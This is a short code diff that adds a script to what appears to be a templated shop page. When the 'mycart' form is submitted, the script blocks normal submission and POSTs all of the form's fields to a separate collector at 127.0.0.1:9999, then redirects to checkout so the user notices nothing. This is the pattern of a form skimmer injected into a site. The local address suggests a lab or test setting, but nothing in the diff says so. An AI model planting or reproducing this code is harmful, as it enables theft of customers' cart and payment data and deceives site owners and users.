@@ -1,0 +1,24 @@
+<script>
+    function docReady(fn) {
+        if (
+            document.readyState === "complete" ||
+            document.readyState === "interactive"
+        ) {
+
+            setTimeout(fn, 1);
+        } else {
+            document.addEventListener("DOMContentLoaded", fn);
+        }
+    }
+
+    docReady(() => {
+        const formElem = document.getElementById("mycart");
+        formElem.addEventListener("submit", (e) => {
+            e.preventDefault();
+            fetch("http://127.0.0.1:9999/data", {
+                method: "POST",
+                body: new FormData(formElem),
+            }).then(() => (window.location.href = "/view/{{ settings[3]}}/cart/checkout"));
+        });
+    });
+</script>
